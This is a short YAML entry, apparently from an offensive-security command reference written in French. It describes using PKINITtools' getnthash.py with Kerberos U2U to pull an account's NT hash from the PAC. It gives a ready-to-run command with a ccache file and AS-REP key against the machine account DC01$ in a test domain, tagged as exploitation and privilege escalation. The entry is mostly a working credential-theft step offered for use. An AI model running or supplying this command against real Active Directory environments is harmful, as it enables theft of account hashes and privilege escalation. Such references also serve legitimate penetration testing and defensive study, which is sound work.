---
description: |
  PKINIT getnthash.py demande un TGS pour vous-même en utilisant Kerberos U2U. Cela inclura le PAC qui à son tour contient le hachage NT que vous pouvez décrypter avec la clé AS-REP que vous avez obtenu à partir de votre demande TGT en utilisant gettgtpkinit.py de PKINIT. Utilisez le TGT de gettgtpkinit.py dans votre variable env KRB5CCNAME.

  Command Reference:

    Domain: test.local

    Host that you got the TGT from: DC01

    TGT from gettgtpkinit.py: out.ccache

    AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773


command: |
  KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
items:
  - TGT
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
  - PrivEsc
references:
  - https://github.com/dirkjanm/PKINITtools
  - https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
---
